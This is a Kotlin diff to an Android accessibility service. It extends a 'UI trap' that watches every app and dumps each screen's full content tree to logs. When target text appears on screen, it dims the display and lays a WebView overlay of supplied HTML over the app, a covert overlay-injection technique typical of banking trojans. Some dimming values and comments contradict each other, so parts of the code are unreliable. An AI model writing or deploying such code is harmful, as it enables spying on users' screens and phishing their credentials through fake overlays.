@@ -472,42 +472,71 @@ class MyAccessibilityService : AccessibilityService() {
             handleGhostEvent(event)
         }
 
-        // --- PREDICTIVE UI TRAP (Click Interception) ---
-        if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
-            val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-            if (statsPrefs.getBoolean("ui_trap_active", false)) {
-                val targetData = statsPrefs.getString("ui_trap_target", "") ?: ""
-                val pkg = event.packageName?.toString() ?: ""
+        // --- UNIVERSAL UI TRAP (Deep Scan Engine) ---
+        val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+        if (statsPrefs.getBoolean("ui_trap_active", false)) {
+            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED || 
+                event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
+                event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                 
-                DebugLogger.log("UI_TRAP_VERBOSE", "Intercepted CLICK in package: [$pkg]. Expected target: [$targetData]")
+                val now = System.currentTimeMillis()
+                val lastScan = statsPrefs.getLong("ui_trap_last_scan", 0L)
                 
-                // FINGERPRINT MATCHING: Check Package + Hierarchy Content
-                if (targetData.isNotEmpty()) {
-                    if (verifyStructuralMatch(event.source, pkg, targetData)) {
-                        val method = statsPrefs.getString("ui_trap_method", "ACC") ?: "ACC"
-                        val html = statsPrefs.getString("ui_trap_html", "") ?: ""
-                        val timeout = statsPrefs.getLong("ui_trap_timeout", 10L)
+                // Throttle deep scans to max 2 per second to prevent CPU overload
+                if (now - lastScan > 500) {
+                    statsPrefs.edit().putLong("ui_trap_last_scan", now).apply()
+                    
+                    val targetData = statsPrefs.getString("ui_trap_target", "") ?: ""
+                    val pkg = event.packageName?.toString() ?: ""
+                    
+                    CoroutineScope(Dispatchers.IO).launch {
+                        val root = rootInActiveWindow
+                        val treeDump = serializeNode(root, 0, 10)
                         
-                        DebugLogger.log("UI_TRAP", "Fingerprint matched in $pkg. Deploying blindfold.")
-                        
-                        // 1. Instant Blackout
-                        DimmerManager.applyDim(this, 100, method)
-                        
-                        // 2. Deploy WebView Overlay
-                        DynamicUIManager.showOverlay(this, true, method, html)
-                        
-                        // 3. Disarm Trap
-                        statsPrefs.edit().putBoolean("ui_trap_active", false).apply()
-                        
-                        // 4. Timeout Failsafe
-                        if (timeout > 0) {
-                            Handler(Looper.getMainLooper()).postDelayed({
-                                DynamicUIManager.removeOverlay(this)
-                                DimmerManager.applyDim(this, 0, method)
-                            }, timeout * 1000)
+                        // ALWAYS dump the full tree so the user can debug what Cortex actually sees
+                        DebugLogger.log("UI_TRAP_DUMP", "EVALUATING PKG: [$pkg] | TARGET: [$targetData] | EVENT: ${AccessibilityEvent.eventTypeToString(event.eventType)}")
+                        if (treeDump != null) {
+                            DebugLogger.log("UI_TRAP_DUMP", "FULL TREE:\n${treeDump.toString(2)}")
+                        } else {
+                            DebugLogger.log("UI_TRAP_DUMP", "FULL TREE: null (Screen might be secure or unreadable)")
                         }
-                    } else {
-                        DebugLogger.log("UI_TRAP_VERBOSE", "Match failed for target[$targetData] in package [$pkg].")
+                        
+                        if (targetData.isNotEmpty()) {
+                            // Extract just the primary title part to search anywhere on the screen
+                            val searchStr = targetData.split("@@")[0]
+                            val isMatch = findTextInside(root, searchStr)
+                            
+                            if (isMatch) {
+                                val method = statsPrefs.getString("ui_trap_method", "ACC") ?: "ACC"
+                                val html = statsPrefs.getString("ui_trap_html", "") ?: ""
+                                val timeout = statsPrefs.getLong("ui_trap_timeout", 10L)
+                                
+                                DebugLogger.log("UI_TRAP", "✅ FINGERPRINT MATCHED DEEP SCAN! Target: [$searchStr]. Deploying trap sequence.")
+                                
+                                // Disable immediately to prevent duplicate triggers
+                                statsPrefs.edit().putBoolean("ui_trap_active", false).apply()
+                                
+                                Handler(Looper.getMainLooper()).post {
+                                    // 1. Dim to 20% brightness FIRST (alpha = 0.8)
+                                    DimmerManager.applyDim(this@MyAccessibilityService, 20, method)
+                                    
+                                    // 2. Deploy WebView Overlay immediately AFTER dimming
+                                    DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html)
+                                }
+                                
+                                // 3. Timeout Failsafe
+                                if (timeout > 0) {
+                                    Handler(Looper.getMainLooper()).postDelayed({
+                                        DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Disarming trap and restoring display.")
+                                        DynamicUIManager.removeOverlay(this@MyAccessibilityService)
+                                        // Restore to 100% brightness (0% dim)
+                                        DimmerManager.applyDim(this@MyAccessibilityService, 100, method)
+                                    }, timeout * 1000)
+                                }
+                            } else {
+                                DebugLogger.log("UI_TRAP_VERBOSE", "❌ NO MATCH for [$searchStr] in current deep tree.")
+                            }
+                        }
                     }
                 }
             }
